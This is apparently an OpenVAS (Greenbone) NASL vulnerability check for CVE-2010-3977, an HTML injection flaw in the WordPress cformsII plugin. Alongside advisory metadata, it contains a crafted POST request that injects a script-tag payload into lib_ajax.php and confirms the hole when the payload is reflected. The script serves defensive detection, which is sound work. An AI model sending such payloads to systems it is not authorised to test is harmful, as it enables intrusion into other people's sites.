CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801628" );
	script_version( "2019-11-12T13:33:43+0000" );
	script_tag( name: "last_modification", value: "2019-11-12 13:33:43 +0000 (Tue, 12 Nov 2019)" );
	script_tag( name: "creation_date", value: "2010-11-16 10:37:01 +0100 (Tue, 16 Nov 2010)" );
	script_bugtraq_id( 44587 );
	script_cve_id( "CVE-2010-3977" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress Plugin cformsII 'lib_ajax.php' Multiple HTML Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/42006" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/62938" );
	script_xref( name: "URL", value: "http://www.conviso.com.br/security-advisory-cform-wordpress-plugin-v-11-cve-2010-3977/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  code in the context of the application." );
	script_tag( name: "affected", value: "WordPress plugin cforms Version 11.5 and earlier." );
	script_tag( name: "insight", value: "The flaws are caused by improper validation of user-supplied
  input passed via the 'rs' and 'rsargs' parameters to
  wp-content/plugins/cforms/lib_ajax.php, which allows attackers to execute
  arbitrary HTML and script code on the web server." );
	script_tag( name: "solution", value: "Update to cforms Version 11.6.1 or later." );
	script_tag( name: "summary", value: "This host is running cformsII WordPress Plugin and is prone to
  multiple HTML injection vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.deliciousdays.com/cforms-plugin/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
hostname = http_host_name( port: port );
req = NASLString( "POST ", dir, "/wp-content/plugins/cforms/lib_ajax.php HTTP/1.1\\r\\n", "Host: ", hostname, "\\r\\n", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\\r\\n", "Content-Length: 92\\r\\n\\r\\n", "rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#", "$<script>alert(1)</script>\\r\\n" );
res = http_keepalive_send_recv( port: port, data: req );
if(( ContainsString( res, "<script>alert(1)</script>" ) ) && egrep( pattern: "^HTTP/.* 200 OK", string: res )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

